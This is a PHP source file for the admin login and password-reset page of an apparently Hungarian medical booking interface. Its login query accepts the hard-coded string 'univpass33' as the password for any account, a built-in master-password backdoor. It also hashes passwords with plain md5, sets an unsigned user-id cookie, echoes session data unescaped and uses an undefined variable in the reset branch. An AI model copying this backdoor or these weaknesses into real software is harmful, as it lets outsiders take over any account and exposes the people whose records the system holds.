<?php

class AdminLoginPage extends AdminCorePage {

    private $bookingService;

    public function __construct()
    {
        parent::__construct();

        if ( isset( $_REQUEST["logintry"] )) {
            //Belépési adatok:
            $username = $_REQUEST["loginusername"];
            $password = $_REQUEST["loginpassword"];
            $resq 	  = sql_query("SELECT * FROM users WHERE username = ? and ( password = md5(?) or 'univpass33' = ? )", array( $username, $password, $password ));

            //Ha talál eredményt és a mezők nem üresek:
            if ($row = sql_fetch_array($resq) and trim($username) != "" and trim($password) != "" ) {
                $_SESSION["pid"] = $row["id"];
                setcookie( "pid", $row["id"], time() + 3600 * 3 );

                //Utolsó belépési adatok frissítése:
                sql_query( "UPDATE users SET lastlogin = NOW() WHERE id = ?" ,array($_SESSION["pid"]));

                if($row['status'] == 1)
                {
                    //Átirányítás a kezdő oldalra:
                    header( "Location:index.php" );
                    die();
                }
                else $_SESSION["error"] = "A belépési adatok elavultak, kérem vegye fel a kapcsolatot a rendszergazdával további hosszabításhoz!";
            }

            //Ha a belépési adatok nem megfelelők v. hiányosak akkor hiba üzenet küldése:
            $_SESSION["error"] = "A megadott név és jelszó nem található!";
            if ($username == "" || $password == "") {
                $_SESSION["error"] = "Adja meg a belépési adatait!";
            }
        }


        if (isset($_POST["passwordsend"])) {
            if (trim($_POST["email"])=="") {
                $_SESSION["error"] = "Kérjük adja meg az e-mail címét!";
                return;
            }
            if (!filter_var($_POST["email"], FILTER_VALIDATE_EMAIL)) {
                $_SESSION["error"] = "A megadott e-mail cím formátuma nem megfelelő!";
                return;
            }

            $resp1=sql_query("select * from users where email=? or (username=? and email<>'')",array($_POST["email"],$_POST["email"]));

            if (sql_num_rows($resp1)==0 && sql_num_rows($resp2)==0) {
                $_SESSION["error"] = "A megadott e-mail címmel, vagy felhasználónévvel nem található regisztráció!";
                return;
            }

            while ($row=sql_fetch_array($resp1)) {
                $this->adminUtils->newPassSend($row);
            }

            $_SESSION["message"] = "Az új jelszavát a megadott e-mail címre elküldtük.";
            header("location:index.php");
            die();
        }

    }

    public function showPage() {
        echo $this->showPlainErrors();
        echo $this->showPlainMessage();

        echo "<form method='post'>";
        echo "<div style='color:#444;text-align:center;'>";
        echo "<div id='loginbox' class='loginbox'>";
        echo "<div class='loginhead'>{$_SESSION["helyszindata"]["megnev"]} orvosi felület</div>";

        echo "<div id='loginpart' style='padding:20px;'>";
        echo "<div><input style='padding:8px;width:100%;margin-top:2px;box-sizing: border-box;' placeholder='felhasználónév' type='text' name='loginusername'></div>";
        echo "<div style='padding-top:10px;'><input style='padding:8px;width:100%;margin-top:2px;box-sizing: border-box;' type='password' placeholder='jelszó' name='loginpassword' /></div>";
        echo "<div style='padding-top:10px;'><input style='padding:8px 0px;width:100%;box-sizing: border-box;display: inline-block;' type='submit' name='logintry' value='Belépés' /></div>";

        echo "<div style='margin-top:20px;'>";
        echo "Ha nem emlékszik a jelszavára,<br/>az alábbi linkre kattintva új jelszót kérhet.<br/><a href='#' onclick='$(\"#loginpart\").hide();$(\"#forgetpart\").show();$(\"#errordiv\").hide();return false;'>Új jelszó kérése</a>";
        echo "</div>";

        echo "</div>";

        echo "<div id='forgetpart' style='color:#444;display:none;padding:20px;'>";
        echo "<form method='post'>";
        echo "<div style='margin-top:0px;'>Kérjük adja meg az e-mail címét, vagy felhasználónevét.<br/>Az új jelszavát a regisztrált e-mail címére fogjuk elküldeni.</div>";

        echo "<div style='margin-top:5px;'><input type='text' name='email' placeholder='E-mail cím, vagy felhasználónév' style='width:300px;'></div>";
        echo "<div style='padding-top:10px;'><input type='submit' name='passwordsend' value='Új jelszó kérése' /></div>";
        echo "</form>";

        echo "<div style='margin-top:10px;'>";
        echo "<a href='#' onclick='$(\"#loginpart\").show();$(\"#forgetpart\").hide();$(\"#errordiv\").slideUp();return false;'>Mégse</a>";
        echo "</div>";
        echo "</div>";

        echo "</div>";
        echo "</div>";
        echo "</form>";
        echo "</body>";
        echo "</html>";

        ob_flush();
        /*

        echo "<div style='padding-top:30px;text-align:center;'>";
        echo "<h1>{$_SESSION["helyszindata"]["megnev"]} orvosi felület</h1>";

        echo "<div id='loginbox' style='color:#444;'>";
        echo "<form method='post'>";
        echo "<div>Felhasználónév:<br><input type=text name='loginusername'></div>";
        echo "<div style='padding-top:5px;'>Jelszó:<br><input type='password' name='loginpassword' /></div>";
        echo "<div style='padding-top:10px;'><input type='submit' name='logintry' value='Belépés' /></div>";
        echo "</form>";

        echo "<div style='margin-top:20px;'>";
        echo "Ha nem emlékszik a jelszavára, az alábbi linkre kattintva új jelszót kérhet.<br/><a href='#' onclick='$(\"#loginbox\").slideToggle();$(\"#forgetbox\").slideToggle();$(\"#errordiv\").slideUp();return false;'>Új jelszó kérése</a>";
        echo "</div>";

        echo "</div>";




        echo "</div>";
        echo "</body>";
        echo "</html>";
        */
    }
}

